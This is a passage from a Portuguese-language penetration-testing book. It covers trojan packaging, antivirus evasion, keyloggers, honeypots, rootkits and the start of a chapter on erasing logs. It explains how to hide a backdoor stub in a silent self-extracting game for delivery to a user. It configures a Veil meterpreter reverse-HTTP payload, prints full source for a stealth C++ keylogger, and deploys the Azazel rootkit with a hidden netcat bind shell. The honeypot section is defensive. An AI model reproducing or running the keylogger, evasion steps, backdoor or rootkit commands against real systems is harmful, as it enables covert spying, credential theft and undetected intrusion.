artir\tdo\tarquivo\t\n.bat\n\tpelo\tprograma\t“Bat\tto\tExe\nConverter”,\tconforme\tmostra\ta\tfigura\t12.3.\nO\tdownload\tdo\tarquivo\t“Bat\tto\tExe”\tpode\tser\trealizado\tem:\nhttp://www.f2ko.de/programs.php?lang=en&pid=b2e\n.\nFigura\t12.3\t–\tTela\tdo\tprograma\t“Bat\tto\tExe\tConverter”.\nSelecione\tos\ttrês\tarquivos\te\tselecione\t\nAdd\tto\tarchive...\n\tconforme\tmostra\ta\tfigura\n12.4.\nNa\taba\t\nGeneral\n:\n•\tSelecione\tno\tcampo\t\nArchive\tformat\n\to\ttipo\t\nZIP\n.\n•\tSelecione\tno\tcampo\t\nCompression\tmethod\n\ta\topção\t\nBest\n.\n•\tSelecione\tno\tcampo\t\nArchiving\toptions\n\ta\topção\t\nCreate\tSFX\tarchive\n.Figura\t12.4\t–\tAdicione\tos\ttrês\tarquivos\tcom\to\tWinrar.\nNa\taba\t\nAdvanced\n:\n•\tSelecione\to\tbotão\t\nSFX\tOptions\n\tpara\tconfigurar\tas\topções\tdo\tarquivo\nautoextrator.\nNa\taba\t\nSetup\n:\n•\tSelecione\to\tarquivo\tque\tserá\tinicializado\tapós\ta\textração\t(no\tnosso\tcaso,\ndeverá\tser\to\t\nSTUB.exe\n,\tpois\tele\té\tum\tbinário\tque\tvai\tinicializar\ta\tjogo\te\ta\nbackdoor)\tescrevendo\to\tnome\t\nSTUB.exe\n\tdentro\tdo\tcampo\t\nSetup\tProgram\t>\nRun\tafter\textraction\n.\nNa\taba\t\nModes\n:\n•\tMarque\to\tcheckbox\t\nUnpack\tto\ttemporary\tfolder\n\tpara\textrair\tos\tarquivos\tda\npasta\ttemporária\tdo\tWindows\te\tmarque\ttambém\t\nSilent\tMode\t>Hide\tall\t\npara\nque\ta\textração\tdo\tarquivo\tseja\trealizada\tem\tmodo\tsilencioso\t(sem\nanimações).\nO\tarquivo\t\nDesktop.exe\n\tfoi\tcriado\tcom\tsucesso\te\tpoderá\tser\tencaminhado\tao\nusuário.\n12.4\tBypass\tA.V\nOs\tarquivos\tcriados\tcom\to\tMetasploit\tsão\tdefinidos\tcomo\tarquivos\tvirais.\tIsso\nporque\tcarregam\tdentro\tdeles\tum\tconjunto\tde\tinstruções\tque\tempresas\tde\nantivírus\tdetectam\tcomo\tsendo\tum\tarquivo\tmalicioso\t(e\tde\tfato\té).\tPorémpodem\tser\tencontrados\tna\tinternet\tinúmeros\tmétodos\tpara\tse\tesconder\to\tarquivo\nda\tdetecção\tviral:\tobfuscação\tviral,\tnovos\tpayloads,\tencoders\te\tcrypters.\nQuando,\tpor\texemplo,\tum\tarquivo\tse\ttorna\tde\tacesso\tpúblico,\tas\tempresas\tde\nantivírus\tpodem\tdecidir\tclassificá-lo\tcomo\tmalicioso.\tPara\tque\tpossamos\n“camuflar”\to\tnosso\tarquivo,\tsem\tque\to\teste\tperca\ta\tsua\tfuncionalidade,\té\nnecessário\tconhecimentos\tem\talguma\tlinguagem\tde\tprogramação.\tCrypters\te\nencoders\tde\tacesso\tpúblico\tusados\tem\tcodificação\tde\tarquivos\tmaliciosos\ntambém\ttêm\tuma\tassinatura\tviral\te\ttambém\tsão\tclassificados\tcomo\tmaliciosos.\nO\tmelhor\tmétodo\tpara\tcamuflar\t100%\to\tseu\tarquivo\tmalicioso\tcontra\tantivírus\té\nprogramando-o.\n12.4.1\tCompressores\tde\tarquivos\nTrata-se\tde\tum\tmétodo\tantigo\tpara\tcompactar\to\tarquivo,\tou\tseja,\tutilizando-se\nde\tprogramas\tespeciais,\ttais\tcomo\to\tUPX\tou\tPetite,\té\tpossível\tcriar\tum\tarquivo\ncom\tum\ttamanho\tbem\treduzido\tem\trelação\tao\toriginal.\tAo\tse\trealizar\tessa\ntécnica,\to\tarquivo,\tpor\tter\tum\ttamanho\tmenor\te\tuma\testrutura\tdiferente,\nconsegue\tburlar\to\tsistema\tde\tantivírus.\nVale\tlembrar\tque\tessa\ttécnica\té\tantiga\te\ta\tdetecção\tde\tassinaturas\tvirais\té\tbem\nmais\tsofisticada\tdo\tque\tno\tpassado.\tPorém\tesse\tmétodo\tvale\ta\tpena\tser\tcitado\te\ntestado.\nO\tUPX\tpode\tser\tobtido\tem\t\nhttp://upx.sourceforge.net/\n.\n\t\nO\tPetite\tpode\tser\tobtido\nem\t\nhttp://www.un4seen.com/petite/\n.\nEncorajo\to\tleitor\ta\trealizar\to\tdownload\tdesses\tdois\tarquivos,\tcriar\tum\tarquivo\nmalicioso\tcom\to\tMetasploit\te\ttestá-lo\tcontra\ta\tsua\tsolução\tde\tantivírus.\n12.4.2\tCrypters/Encoders\nOutro\tmétodo\talém\tde\tcompactadores\té\ta\tutilização\tde\tencriptadores.\nDiferentemente\tdos\tcompactadores,\tos\tencriptadores\tadicionam\tcriptografia\tno\narquivo,\tdificultando\ta\tdetecção\tde\tum\tarquivo\tmalicioso.\tEmbora\to\tsistema\tde\nantivírus\tnão\tdetecte\to\tantigo\tcódigo\tmalicioso\tcomo\tsendo\tum\tcódigo\nmalicioso,\to\tantivírus\tpode\tdetectar\to\tcódigo\tdo\tencriptador\te\talertar\to\tusuário\nde\tque\to\tprograma\tencriptado\té\tmalicioso.\nUm\texemplo\tde\tencriptador\té\to\tprograma\tThemida\tque\tpode\tser\tobtido\tem\nhttp://www.oreans.com/\n.12.4.3\tVeil-Framework\nO\tVeil-Framework\té\tum\tframework\tque\tpermite\ta\tcodificação\tde\tarquivos\nbinários\tpara\tse\ttentar\tobfuscar\to\tseu\tcódigo.\tPode\tser\tobtido\tem\nhttps://github.com/Veil-Framework/Veil-Evasion/\n.\nroot@kali#\n\tgit\tclone\thttps://github.com/Veil-Framework/Veil-Evasion/\nroot@kali#\n\tcd\tVeil-Evasion\nroot@kali#\n\tpython\tVeil-Evasion.py\nO\tVeil-Framework\té\tatualizado\tcom\to\tcomando:\nupdate\nOs\tpayloads\tdo\tVeil-Framework\tpodem\tser\tlistados\tcom:\nlist\nO\tpayload\tpode\tser\tutilizado\tcom\to\tcomando\t\nuse\tpayload\n,\tpor\texemplo:\nuse\tc/meterpreter/rev_http\nAs\topções\tdo\tpayload\tpodem\tser\tmudadas\tcom\t\nset\topção\tvalor\n,\tpor\texemplo:\nset\tLHOST\t192.168.1.100\nset\tLPORT\t12345\nO\tpayload\tpode\tser\tgerado\tcom\to\tcomando:\ngenerate\nPor\tpadrão,\to\tarquivo\tserá\tgerado\tem\t\n/root/veil-output\n.\nO\thash\tdo\tarquivo\tgerado\tpode\tser\tchecado\tno\tvírus\ttotal\n(\nhttp://www.virustotal.com\n)\tcom\to\tcomando:\nchechvt\nO\tarquivo\tgerado\tpode\tser\tdeletado\t(útil\tpara\tapagar\ta\tpasta\tcom\tos\tarquivos\nfinais\tgerados)\tcom\to\tcomando:\nclean\nCom\to\tarquivo\tgerado,\tteste-o\tcontra\tseu\tantivírus.\tCaso\to\tantivírus\tdetecte-o\ncomo\tsendo\tmalicioso,\ttente\toutro\tpayload\tdo\tVeil-Framework.\n12.5\tKeylogger\nKeyloggers\tsão\tprogramas\tque\tarmazenam\tem\tum\tarquivo\tde\ttexto\ttudo\taquiloque\tfor\tdigitado\tpelo\tusuário,\tpara\tposterior\tverificação.\tAlém\tde\tserem\nfundamentais\tem\tpentest,\tsão\tmuito\tutilizados\tpela\tespionagem,\tpara\tsaber\nsenhas\tde\tuma\tpessoa,\tcom\tquem\tela\tconversa\te\tmonitorar\ttoda\ta\tsua\tatividade\nna\tinternet.\nNormalmente\tkeyloggers\tsão\tencontrados\tna\tinternet\tcom\to\tcódigo-fonte\nfechado,\tporém\tesses\tarquivos\tsão\tpouco\tconfiáveis.\tHá\tversões\tcomerciais\tde\nkeyloggers,\tcomo\to\tArdamax.\nUm\tkeylogger\tpode\tser\tfacilmente\tescrito\tna\tlinguagem\tC++.\n//Código-fonte\tde\tum\tkeylogger\tescrito\tem\tC++\n//Compile\to\tcódigo\tcom\to\tDevC++\n//Fonte:\thttps://dl.dropboxusercontent.com/u/110076680/WinKeyLogger.txt\n#include\t<iostream>\n#include\t<fstream>\nusing\tnamespace\tstd;\n#include\t<windows.h>\n#include\t<Winuser.h>\nint\tsave\t(int\tkey_stroke,\tchar\t*file){\n\t\t\t\tif((key_stroke\t==\t1)\t||\t(key_stroke\t==\t2))\treturn\t0;\n\t\t\t\tFILE\t*OUTPUT_FILE;\n\t\t\t\tOUTPUT_FILE\t=\tfopen(file,\t\"a+\");\n\t\t\t\tif(key_stroke\t==\t8)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[BACKSPACE]\t\");\nelse\tif(key_stroke\t==\t32)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"\t\");\nelse\tif(key_stroke\t==\t18)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[ALT]\t\");\nelse\tif(key_stroke\t==\t91)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[WINDOWS]\t\");\nelse\tif(key_stroke\t==\t17)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[CONTROL]\t\");\nelse\tif(key_stroke\t==\t16)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[SHIFT]\t\");\nelse\tif(key_stroke\t==\t20)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[CAPS\tLOCK]\t\");\nelse\tif(key_stroke\t==\t9)\t\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[TAB]\t\");\nelse\tif(key_stroke\t==\t13)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"\\n\");\nelse\tif(key_stroke\t==\t36)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[HOME]\t\");\nelse\tif(key_stroke\t==\t35)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[END]\t\");\nelse\tif(key_stroke\t==\t46)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[DELETE]\t\");\nelse\tif(key_stroke\t==\t33)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[PAGE\tUP]\t\");\nelse\tif(key_stroke\t==\t45)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[INSERT]\t\");\nelse\tif(key_stroke\t==\t34)\tfprintf(OUTPUT_FILE,\t\"%s\",\t\"[PAGE\tDOWN]\t\");\n\t\t\t\telse\tfprintf(OUTPUT_FILE,\t\"%s\",\t&key_stroke);\nfclose(OUTPUT_FILE);\ncout\t<<\tkey_stroke\t<<\tendl;\nreturn\t0;return\t0;\n}\nvoid\tstealth\t(){\nHWND\tstealth;\nAllocConsole();\nstealth\t=\tFindWindowA(\"consoleWindowClass\",\tNULL);\nShowWindow(stealth,\t0);\n}\nint\tmain(){\nstealth();\nchar\ti;\nwhile(1){\n\t\t\t\tfor\t(i\t=\t8;\ti<=190;\ti++){\n\t\t\t\t\t\t\t\tif\t(GetAsyncKeyState(i)\t==\t-32767)\n\t\t\t\t\t\t\t\t\t\t\t\tsave(i,\t\"LOG.TXT\");\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsystem(\"PAUSE\");\n\t\t\t\treturn\t0;}\n12.6\tHoneypots\nOs\thoneypots,\ttambém\tchamados\tde\t“potes\tde\tmel”,\tsão\tsoftwares\tque\tsimulam\num\tserviço/servidor\tmal\tconfigurado\te\tvulnerável.\tCom\tisso,\to\tatacante\tvai\tfazer\na\tvarredura\tna\trede,\tdetectar\to\thoneypot\te\tpensar\tque\taquele\tsoftware\té\nvulnerável.\nNormalmente,\to\thoneypot\té\tutilizado\tpara\tcapturar\tatacantes\tque\tfazem\nvarreduras\tna\trede\tou,\taté\tmesmo,\té\tutilizado\tpara\tsaber\tqual\to\tcomportamento\te\natitude\tdo\tatacante\tem\tfrente\ta\tum\tsoftware\tvulnerável.\nOs\thoneypots\tpodem\tser\tcategorizados\tem\talta\tinteratividade\te\tbaixa\ninteratividade:\n•\t\nHoneypots\tde\talta\tinteratividade\n\té\tum\tsistema\toperacional\tconfigurado\npara\tservir\tcomo\thoneypot\te\ttem\tuma\texcelente\tinteração\tcom\to\tatacante,\ndando\ta\tsuposta\timpressão\tde\tque\tse\ttrata\tde\tum\tsistema\tvulnerável.\tEsse\ntipo\tde\thoneypot\té\tde\tdifícil\tdetecção\tpara\tscanners\tcomo\to\tOpenVAS\te\to\nNmap.\tOs\tprincipais\thoneypots\tde\talta\tinteratividade\tsão\tos\thoneynets.\n•\t\nHoneypots\tde\tbaixa\tinteratividade\n\tinteragem\tcom\to\tatacante\te\taté\tpodem\npresenteá-lo\tcom\tuma\tfalsa\tshell\tdo\tsistema.\tEsse\ttipo\tde\thoneypot\téfacilmente\tdetectado\tcom\tscanners\tcomo\to\tNmap,\tOpenVAS\tou\tNessus.\nNormalmente,\thoneypots\tde\tbaixa\tinteratividade\tsão\tsoftwares\tinstalados\tem\nalgum\tsistema\toperacional.\nUm\thoneypot\tde\tbaixa\tinteratividade\tpode\tser\tcriado\tcom\to\tnetcat.\n•\tInicialize\to\tservidor\tSSH\tno\tKali\tLinux:\nroot@kali#\t\nservice\tssh\tstart\n•\tCapture\to\tbanner\tcom\to\tNmap:\nroot@kali#\n\tnmap\tlocalhost\t-sV\t-p\t22\n•\tCopie\to\tbanner\tcapturado\tpelo\tNmap\tpara\to\tarquivo\t\nhoneypot.txt\n:\nOpenSSH\t6.0p1\tDebian\t4+deb7u2\t(protocol\t2.0)\n•\tFinalize\to\tservidor\tSSH:\nroot@kali#\n\tservice\tssh\tstop\n•\tInicialize\to\tnetcat\tdentro\tde\tum\tlaço\t\nwhile\n:\nroot@kali#\t\nwhile(true);\tdo\tnc\t–l\t–p\t22\t–vvv\t<\thoneypot.txt;\tdone\n•\tRealize\ta\tvarredura\tcom\to\tNmap:\nroot@kali#\t\nnmap\tlocalhost\t-sV\nOutros\texemplos\tde\thoneypots\tde\tbaixa\tinteratividade\tsão\to\tValhala\tHoneypot\te\no\thoneyd.\n12.6.1\tValhala\tHoneypot\nO\tprograma\tValhala\tHoneypot\tpermite\ta\tconfiguração\tde\tdiversos\ttipos\tde\nserviços\tpara\thoneypot,\tcomo\tservidor\tFTP,\tweb\te\toutros.\tO\tdownload\tdo\nValhala\tHoneypot\tpode\tser\trealizado\tem\t\nhttp://valhalahoneypot.sourceforge.net\n.\nPor\texemplo,\tpara\tconfigurar\tum\thoneypot\tem\tum\tservidor\tSMTP,\tacesse\ta\taba\nConfigurar\n,\tconforme\tindica\ta\tfigura\t12.5.\nFigura\t12.5\t–\tTela\tinicial\tdo\tValhala\tHoneypot.Figura\t12.5\t–\tTela\tinicial\tdo\tValhala\tHoneypot.\nConfigure\tum\tservidor\tSMTP,\tconforme\tmostra\ta\tfigura\t12.6.\nFigura\t12.6\t–\tO\tValhala\tHoneypot\tpossibilita\tao\tusuário\tconfigurar\tvários\ttipos\nde\thoneypots.\nHabilite\to\tminisservidor\tSMTP\te\tinicie\to\tmonitoramento.\nRealize\tuma\tconexão\tcom\to\tservidor\tSMTP\tdo\thoneypot;\ta\ttentativa\tde\tconexão\nserá\tmostrada\tno\tValhala:\nroot@kali#\t\nnc\t192.168.1.101\t25\n12.6.2\tHoneyd\nO\thoneyd\té\tum\texcelente\thoneypot\tdesenvolvido\tem\tcódigo-fonte\taberto.\tFaz\ta\nemulação\tde\tdiversos\tsistemas\toperacionais,\tportas\te\tserviços.\tO\thoneyd\tnão\nestá\trelacionado\tna\tlista\tdo\tapt-get\tdo\tDebian\t7.4;\tpara\tisso,\taltere\to\tarquivo\n/etc/apt/sources.list\n\tdo\tDebian\tpara\tque\to\thoneyd\tseja\tinstalado\tvia\tapt-get\n1\n:\n##Sources.list\tpara\tDebian\tSqueeze\ndeb\thttp://http.debian.net/debian/\tsqueeze\tmain\tcontrib\tnon-free\ndeb-src\thttp://http.debian.net/debian/\tsqueeze\tmain\tcontrib\tnon-free\ndeb\thttp://http.debian.net/debian\tsqueeze-lts\tmain\tcontrib\tnon-free\ndeb-src\thttp://http.debian.net/debian\tsqueeze-lts\tmain\tcontrib\tnon-free\nroot@debian#\t\napt-get\tupdate\nroot@debian#\t\napt-get\tinstall\thoneyd\nPara\ttestes\trealizados\tem\tmáquinas\tvirtuais,\tcertifique-se\tde\tque\ta\tinterface\ncabeada\testá\tem\tmodo\tpromíscuo\t(\nConfigurações\t>\tRede\t>\tAdaptador\t1\t>\nAvançado\t>\tModo\tPromíscuo\t>\tPermitir\tTudo\n),\tconforme\tmostra\ta\tfigura\t12.7.Figura\t12.7\t–\tCabo\tem\tmodo\tpromíscuo\tna\tmáquina\tvirtual\té\tpré-requisito\npara\tos\tlaboratórios\tcom\to\thoneyd.\n12.6.2.1\tLaboratório\tHoneyd:\tHoneypot\nPara\to\tprimeiro\tlaboratório\tserá\tcriado\tum\thoneypot\tque\tsimula\tuma\tmáquina\nWindows\tXP\tSP1,\tcom\tas\tportas\t139\te\t445\tabertas.\nSerá\tnecessário\tcriar\tum\tarquivo\tde\tconfiguração\tcom\tas\thoneypots\tque\tserão\nemuladas.\nCrie\to\tarquivo\t\nhoneyd.conf\n:\ncreate\tdefault\nset\tdefault\tdefault\ttcp\taction\tblock\nset\tdefault\tdefault\tudp\taction\tblock\nset\tdefault\tdefault\ticmp\taction\tblock\ncreate\twindows\nset\twindows\tpersonality\t\"Microsoft\tWindows\tXP\tSP1\"\nset\twindows\tdefault\ttcp\taction\treset\nadd\twindows\ttcp\tport\t135\topen\nadd\twindows\ttcp\tport\t139\topen\nadd\twindows\ttcp\tport\t445\topen\nset\twindows\tethernet\t\"00:00:24:c8:e3:34\"\ndhcp\twindows\ton\teth0\nOs\tcomandos\t\ncreate\tdefault\n\te\t\nset\tdefault\tdefault\ttcp/udp/icmp\taction\tblock\n\tcriam\nas\tregras\tpadrões\tpara\to\thoneypot.\tNo\tcaso,\tos\tpacotes\tTCP,\tUDP\te\tICMP\tque\nnão\tforem\tdestinados\tao\thoneypot\tserão\tdescartados.\nAs\tregras\ta\tseguir\tindicam\tao\thoneyd\tque\tserá\tcriado\tum\thoneypot\tcom\to\ntemplate\tdo\tWindows\tXP\tsp1,\to\ttráfego\tdestinado\tao\tTCP\tserá\tdescartado\te\to\nhoneypot\tterá\tas\tportas\t135,\t139\te\t445\tabertas\tcom\to\tendereço\tMAC\n“00:00:24:c8:e3:34”.\ncreate\twindowsset\twindows\tpersonality\t\"Microsoft\tWindows\tXP\tSP1\"\nset\twindows\tdefault\ttcp\taction\treset\nadd\twindows\ttcp\tport\t135\topen\nadd\twindows\ttcp\tport\t139\topen\nadd\twindows\ttcp\tport\t445\topen\nset\twindows\tethernet\t\"00:00:24:c8:e3:34\"\nA\túltima\tregra\tindica\tao\thoneyd\tque\to\thoneypot\tWindows\tterá\to\tseu\tIP\tatribuído\nvia\tDHCP.\ndhcp\twindows\ton\teth0\nInicie\to\thoneyd\tcom:\nroot@debian#\t\nhoneyd\t-d\t-f\thoneyd.conf\nRealize\to\tscan\tcom\to\tNmap:\nroot@kali#\n\tnmap\tIP_HONEYPOT\t-O\nO\tresultado\tdo\tscan\té\tcapturado\tpelo\thoneyd.\nhoneyd[18536]:\tSend\tICMP\tEcho\tReply:\t192.168.1.105\t->\t192.168.1.100\thoneyd[18536]:\tSend\tICMP\nEcho\tReply:\t192.168.1.105\t->\t192.168.1.100\nhoneyd[18536]:\tConnection\trequest:\ttcp\t(192.168.1.100:61063\t-\t192.168.1.105:38854)\nhoneyd[18536]:\tConnection\tdropped\tby\treset:\ttcp\t(192.168.1.100:61063\t-\t192.168.1.105:38854)\nhoneyd[18536]:\tKilling\tunknow\tconnection:\ttcp\t(192.168.1.100:61063\t-\t192.168.1.105:38854)\n12.6.2.2\tLaboratório\tHoneyd:\tMúltiplos\thoneypots\nÉ\tpossível\tcriar\tvários\thoneypots\tcom\to\thoneyd,\tpara\tisso\tverifique\to\tarquivo\n/usr/share/honeyd/nmap.prints\n.\tEsse\tarquivo\tutiliza\to\tfingerprinting\tde\tdetecção\ndo\tsistema\toperacional\tdo\tNmap\tpara\ttentar\tenganar\to\tpróprio\tNmap.\nPara\tcriarmos\tmúltiplos\thoneypots,\tsimplesmente\té\tinserida\tno\tarquivo\ta\npersonalidade\tdo\tsistema\tque\tse\tqueira\tcriar.\nArquivo\t\nhoneyd.conf\n:\ncreate\tdefault\nset\tdefault\tdefault\ttcp\taction\tblock\nset\tdefault\tdefault\tudp\taction\tblock\nset\tdefault\tdefault\ticmp\taction\tblock\ncreate\twindows\nset\twindows\tpersonality\t\"Microsoft\tWindows\tXP\tSP1\"\nset\twindows\tdefault\ttcp\taction\treset\nadd\twindows\ttcp\tport\t135\topen\nadd\twindows\ttcp\tport\t139\topen\nadd\twindows\ttcp\tport\t445\topenadd\twindows\ttcp\tport\t445\topen\nset\twindows\tethernet\t\"00:00:24:c8:e3:34\"\ndhcp\twindows\ton\teth0\ncreate\tsolaris\nset\tsolaris\tpersonality\t\"Avaya\tG3\tPBX\tversion\t8.3\"\nset\tsolaris\tdefault\ttcp\taction\treset\nadd\tsolaris\ttcp\tport\t22\topen\nadd\tsolaris\ttcp\tport\t2049\topen\nset\tsolaris\tethernet\t\"00:00:24:c8:e3:14\"\ndhcp\tsolaris\ton\teth0\n12.6.2.3\tLaboratório\tHoneyd:\tHoneypot\tcom\tIP\testático\nPara\tcriar\tum\t\nhoneypot\n\tcom\tIP\testático,\ttroque\ta\tlinha\ndhcp\tsolaris\ton\teth0\nPor\nbind\t192.168.1.2\tsolaris\n12.7\tRootkits\nO\trootkit\té\tum\tconjunto\tde\tferramentas\tque\tpossibilita\tao\tatacante\tmanter\to\tseu\nacesso\tao\tsistema\tcomprometido\tda\tforma\tmais\tinvisível\tpossível,\tescondendo\narquivos,\tconexões\te\tprocessos.\tNormalmente,\trootkits\texploram\tmódulos\tdo\nKernel\tpara\tocultar\ta\tpresença\tdo\tatacante.\nFundamentalmente\thá\tdois\ttipos\tde\trootkits:\tUserland\te\tKernel\tLand.\n12.7.1\tUserland\nRootkits\tdo\ttipo\tuserland\talteram\tos\tbinários\tdo\tsistema\tpor\tbinários\ncomprometidos.\tPor\texemplo,\tum\trootkit\tdo\ttipo\tuserland\tvai\talterar\to\tcomando\nnetstat\tpelo\tcomando\tnetstat\tinfectado,\tocultando\ta\tsua\tconexão\tao\tcomputador.\nAs\tprincipais\tatividades\tde\tum\trootkit\tdo\ttipo\tuserland\tsão:\n•\t\nEsconder\tarquivos\n\t–\tO\trootkit\tesconde\ta\tsi\tmesmo\te/ou\tarquivos\tcom\nnomes\tespeciais.\n•\t\nEsconder\tprocessos\n\t–\tProcessos\tiniciados\tpelo\trootkit\tnão\tsão\tvisualizados\npor\tcomandos\tcomo\to\t\nps\n\tou\t\ntop\n.\n•\t\nEsconder\tconexões\n\t–\tUm\trootkit\tconsegue\tcamuflar\ta\tsua\tconexão,\tnão\nsendo\tvisualizado\tcom\tcomandos\tcomo\to\t\nnetstat\n.Um\texemplo\tde\trootkit\tdo\ttipo\tuserland\tpara\to\tLinux\té\to\trootkit\tAzazel.\nhttp://packetstormsecurity.com/files/download/125240/azazel-master.zip\n12.7.1.1\tUtilizando\to\trootkit\tAzazel\nO\trootkit\tAzazel\té\tum\trootkit\tdo\ttipo\tuserland\tdestinado\tao\tsistema\toperacional\nLinux.\tO\tAzazel\ttira\tvantagem\tsobre\ta\tvariável\tde\tambiente\t\nLD_PRELOAD\n\t(o\nLinux\tvai\tcarregar\tessa\tbiblioteca\tprimeiro\tantes\tde\tcarregar\tqualquer\tbiblioteca\ndo\tsistema),\tna\tqual\trealiza\ta\tinjeção\tdo\tseu\tcódigo\tmalicioso.\tAlgumas\tde\tsuas\nfuncionalidades\tincluem:\tesconder\tprocessos,\tarquivos\te\tconexões.\nInstale\tas\tdependências\tnecessárias\tpara\to\trootkit\tAzazel:\nroot@debian#\t\napt-get\tinstall\tlibpcap-dev\nroot@debian#\t\napt-get\tinstall\tlibpam0g-dev\nroot@debian#\t\napt-get\tinstall\tlibcurl4-openssl-dev\nO\tarquivo\tde\tconfiguração\tdo\tAzazel\té\to\t\nconfig.py\n.\tNesse\tarquivo\tsão\tdefinidas\nconfigurações\tcomo\ta\tporta\tque\to\tAzazel\tescutará,\t“string\tmágica”\tpara\nesconder\tarquivos\tetc.\tConfigure-o\tde\tacordo\tcom\ta\tsua\tnecessidade.\nCompile\to\tAzazel\tcom:\nroot@debian:~/azazel-master#\n\tmake\nSerá\tgerado\to\tarquivo\t\nlibselinux.so\n;\tcopie-o\tpara\to\tdiretório\t\n/lib\n:\nroot@debian:~/azazel-master#\n\tcp\tlibselinux.so\t/lib\nPara\to\trootkit\ttornar-se\tativo\tno\tsistema,\tdefina\ta\tvariável\tde\tambiente\nLD_PRELOAD\n:\nroot@debian:~/azazel-master#\t\nexport\tLD_PRELOAD=/lib/libselinux.so\nNesse\tmomento,\to\tterminal\testá\tsob\tcontrole\tdo\trootkit.\nPor\texemplo,\tcomo\tpadrão\ta\tstring\tmágica\tpara\tesconder\tarquivos\té\nunderscore+underscore\t“__”.\nCrie\tum\tarquivo\tque\tinicie\tcom\t“__”\t(dois\tunderscores):\nroot@debian#\n\ttouch\t__invisivel\nListe\tos\tarquivos\tcom\t\nls\n:\nroot@debian#\t\nls\nO\tsistema\tnão\tdetecta\to\tarquivo\tcriado\tpelo\trootkit.Que\ttal\tescondermos\tconexões\tna\tmáquina?\nAbrindo\to\tarquivo\tde\tconfiguração\tdo\tAzazel\t(o\tarquivo\t\nconfig.py\n),\tnota-se\tna\nprimeira\tlinha:\nOW_PORT\t=\t\"61040\"\t\t\t\t\t\t\t\t#\tLowest\tsource\tport\tfor\tplain\ttext\tbackdoor\nHIGH_PORT\t=\t\"61050\"\t\t\t\t\t\t#\tHighest\tsource\tport\tfor\tplain\ttext\tbackdoor\nIsso\tsignifica\tque\tconexões\tcom\tportas\tde\torigem\t61040\taté\ta\tporta\t61050\tnão\nsão\tdetectadas\tpor\tcomandos\tcomo\to\tnetstat.\nObservem\ttambém\tque,\tse\tquisermos\tcriar\tuma\tconexão\tcom\to\tnetcat,\tpela\nlinha:\nSHELL_PASSWD\t=\t\"changeme\"\t\t#\tRemote\tpassword\tfor\taccept\tbackdoors\nNós\tdevemos\tinserir\ta\tsenha\tchangeme\tpara\tter\tacesso\tao\tsistema.\nVamos\tentão\tcomprometer\to\tsistema:\nroot@debian:~/azazel-master#\t\nexport\tLD_PRELOAD=/lib/libselinux.so\nVamos\tiniciar\tuma\tconexão\tcom\to\tnetcat:\nroot@debian:~/azazel-master#\t\nnc\t-l\t-p\t666\t-e\t/bin/bash\t&\nNa\tmáquina\tdo\tatacante,\tconecte-se\tao\tIP\t192.168.1.102\tna\tporta\t666,\tutilizando\na\tporta\tde\torigem\t61040,\te\tdigite\ta\tsenha:\nroot@kali#\t\nnc\t192.168.1.102\t666\t-p\t61040\nchangeme\nVai\taparecer\ta\tmensagem\tdo\tAzazel:\nWelcome!\nHere's\ta\tshell:\nEstamos\tno\tsistema\tde\tforma\tinvisível!\nDigite\tno\tDebian:\nroot@debian#\t\nnetstat\t-etn\t|\tgrep\t666\nNenhuma\tconexão\tno\tsistema.\tÉ\tcomo\tse\to\tinvasor\tnão\texistisse\tno\tsistema!\nQualquer\tprocesso\tpode\tser\tiniciado\tdentro\tdo\tnetcat\tque\tnão\tserá\tlistado\tpelo\ncomando\t\nps\n:\nroot@kali#\t\nping\t1.1.1.1\nroot@debian#\t\nps\taux\nO\tcomando\t\nping\n\tnão\té\texibido\tna\tlista\tde\tprocessos\tdo\tDebian.12.7.2\tKernel\tLand\nRootkits\tdo\ttipo\tKernel\tLand\timplementam\to\tseu\tcódigo\tmalicioso\tdiretamente\nno\tKernel,\tpor\tmeio\tde\ttécnicas\tavançadas.\tEsse\ttipo\tde\trootkit\tdepende\tmuito\nde\tqual\té\ta\tversão\tdo\tKernel\tque\testá\tsendo\tutilizada,\tpois\tsão\tespecíficos\tpara\ndeterminada\tversão,\tpor\tisso\tnão\tserão\tdetalhados.\nPara\ta\tdescoberta\tde\tnovos\trootkits,\tacesse\t\nhttp://packetstormsecurity.com\n.\n1\n\tAltere\to\tconteúdo\tdo\tarquivo\t\n/etc/apt/sources.list\n\tsomente\tpara\trealizar\ta\tinstalação\tdo\thoneyd.\nTerminada\tessa\tetapa,\tvolte\tcom\to\tconteúdo\toriginal\tdo\tarquivo\t\n/etc/apt/sources.list\n.\tUma\tboa\tprática\té\nsempre\tmanter\tum\tbackup\tdo\tarquivo\tcom\to\tcomando\t\ncp\t/etc/apt/sources.list\t/etc/apt/sources.listOLD\n.\nPara\trestaurar\to\tarquivo,\trealize\to\tprocesso\tinverso\t\ncp\t/etc/apt/sources.listOLD\t/etc/apt/source.list\n.CAPÍTULO\n\t13\nApagando\trastros\nApós\to\tsistema\tter\tsido\tcomprometido\te\talterações\tterem\tsido\texecutadas,\to\natacante\tentão\ttentará\tapagar\tseus\trastros\te\tlimpar\ta\tcasa,\tou\tseja,\tapagar\tos\tlogs\ndo\tsistema.\nPorém\talgumas\tconsiderações\tdevem\tser\tlevadas\tem\tconta,\tpor\texemplo,\tcom\nadministradores\tmais\tatentos\tque\tpodem\tfazer\to\tredirecionamento\tde\tlogs\tpara\noutros\thosts.\tDessa\tforma,\tapagar\tos\tlogs\tda\tmáquina\tlocal\tnão\tserá\tmuito\tútil,\npois\tmesmo\tque\to\tatacante\tapague\tos\tlogs\tlocais,\tcópias\tdos\tregistros\tjá\tforam\nenviadas\tpara\toutro\tservidor.\nOs\tlogs\tdo\tWindows\tpodem\tser\tlocalizados\tem\t\nc:\\Windows\\system32\\Config\n:\n•\t\nAppEvent.Evt\n\t–\tlogs\tdos\taplicativos\te\toperações.\n•\t\nSecEvent.Evt\n\t–\tlogs\tde\